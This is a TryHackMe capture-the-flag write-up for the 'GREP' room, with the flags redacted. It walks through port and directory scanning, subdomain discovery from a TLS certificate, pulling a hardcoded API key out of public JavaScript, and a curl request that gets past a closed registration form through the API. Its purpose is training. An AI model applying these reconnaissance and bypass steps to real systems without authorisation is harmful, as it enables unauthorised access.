# GREP — TryHackMe Writeup

**Room:** https://tryhackme.com/room/grep
**Difficulty:** Easy
**Category:** OSINT · SSL Certificate · API Key Leakage · Source Code Analysis · Registration Bypass

> *"A web application has been developed — can you find the sensitive information it exposes?"*

---

## Flags

| Flag | Value |
|------|-------|
| Flag 1 (API key) | `THM{█████████████████████████████████████████}` |
| Flag 2 (admin password) | `THM{█████████████████████████████████████████}` |
| Flag 3 (header secret) | `THM{█████████████████████████████████████████}` |

---

## 1. Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -p- 10.10.61.100

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu
80/tcp    open  http     Apache httpd 2.4.41
443/tcp   open  ssl/http Apache httpd 2.4.41
51337/tcp open  http     Apache httpd 2.4.41
```

Four ports. HTTPS on 443 immediately suggests a TLS certificate worth inspecting. Port 51337 is unusual and worth probing.

---

## 2. SSL Certificate — Subdomain Discovery

Navigating to `https://10.10.61.100` triggers a certificate warning. Viewing the certificate details in the browser reveals:

```
Subject Alternative Names:
  DNS: grep.thm
  DNS: leakchecker.grep.thm
```

Two hostnames are exposed in the certificate's SAN field. Add both to `/etc/hosts`:

```bash
echo "10.10.61.100 grep.thm leakchecker.grep.thm" >> /etc/hosts
```

- `https://grep.thm` — the main web application
- `https://leakchecker.grep.thm` — a separate service used later

---

## 3. Source Code Analysis — API Key Leak (Flag 1)

The main application at `https://grep.thm` is a simple web app with a registration and login form. Before interacting with it, run directory enumeration:

```bash
gobuster dir -u https://grep.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -k -x php,txt,html,bak -o gobuster.log
```

```
/login.php       (Status: 200)
/register.php    (Status: 200)
/upload.php      (Status: 200)
/api             (Status: 301)
/public          (Status: 301)
```

Browsing to `/public/` reveals a directory listing containing the application's JavaScript source files. Examining them for hardcoded credentials:

```bash
curl -sk https://grep.thm/public/js/app.js | grep -i "api\|key\|secret\|token"
```

Inside `app.js`:

```javascript
const apiKey = "THM{█████████████████████████████████████████}";
```

**Flag 1** — the API key is hardcoded directly in a publicly accessible JavaScript file.

---

## 4. Registration Bypass — Admin Password (Flag 2)

Attempting to register on `https://grep.thm/register.php` returns:

```
Registration is closed.
```

The form is locked, but the backend API endpoint may still accept requests directly. Inspect the registration request in Burp Suite by trying to register anyway, then look at what the browser sends.

The registration form POSTs to `/api/register` with a JSON body. The API key from Flag 1 is required in the header. Craft the request manually:

```bash
curl -sk -X POST https://grep.thm/api/register \
  -H "Content-Type: application/json" \
  -H "X-THM-API-Key: THM{█████████████████████████████████████████}" \
  -d '{"username":"attacker","password":"attacker123","email":"attacker@attacker.com"}'
```

```json
{"success":true,"message":"User registered successfully"}
```

Registration succeeds by bypassing the UI restriction and hitting the API directly with the required header.

Now log in with those credentials at `https://grep.thm/login.php`. The dashboard loads and reveals the admin credentials in the user management section:

```
Admin Password: THM{█████████████████████████████████████████}
```

**Flag 2** — admin password exposed in the authenticated dashboard.

---

## 5. LeakChecker Subdomain — Header Secret (Flag 3)

Navigate to `https://leakchecker.grep.thm`. The application asks for an email address to check whether it has appeared in data breaches.

Submit the admin email address found in the dashboard. The response returns breach data including:

```
Secret: THM{█████████████████████████████████████████}
```

Alternatively, examining the HTTP response headers of the leakchecker application reveals a custom header:

```bash
curl -sk -I https://leakchecker.grep.thm
```

```
HTTP/1.1 200 OK
X-Secret: THM{█████████████████████████████████████████}
```

**Flag 3** — secret value exposed in a custom HTTP response header.

---

## 6. Port 51337 — Additional Enumeration

The non-standard port hosts another version of the application or an admin-only interface:

```bash
curl -sk http://grep.thm:51337/
```

Exploring this port with the admin credentials and API key may reveal additional exposed data, earlier source code versions, or misconfigured endpoints depending on the room instance.

---

## Key Learnings

- **SSL certificates SAN fields are OSINT goldmines** — every domain and subdomain the certificate protects is listed in the Subject Alternative Names extension. Viewing the certificate in-browser (lock icon → Certificate → SAN) costs nothing and frequently reveals hidden vhosts, internal services, or staging environments.
- **Hardcoded API keys in public JavaScript files are critical secrets** — front-end JavaScript is always readable by users. Any secret, token, or API key embedded in client-side code is immediately exposed to anyone who opens DevTools. Secrets belong server-side only.
- **UI restrictions are not security boundaries** — "Registration is closed" blocks the browser form but not direct API calls. Authentication and authorisation must be enforced at the API layer, not the presentation layer.
- **Custom HTTP headers can leak sensitive data** — developers sometimes add `X-Debug`, `X-Secret`, or `X-Token` headers during development and forget to remove them. Always inspect all response headers (`curl -I` or Burp) not just the body.
- **Non-standard ports need enumeration too** — port 51337 would be missed by a default Nmap scan (`-F` or top 1000 ports). Always include `-p-` for CTFs and full-scope penetration tests to catch unusual service ports.

## Conclusion

GREP teaches the habit of multi-layered enumeration: certificate inspection for subdomain discovery, JavaScript source analysis for hardcoded secrets, direct API interaction to bypass UI restrictions, and response header inspection for hidden values. None of these steps require complex exploitation — they are all about reading what the application already exposes. The room's central message is that developers frequently leave secrets in the wrong places (client-side JS, response headers, API endpoints without authentication), and a methodical examiner will find every one of them.
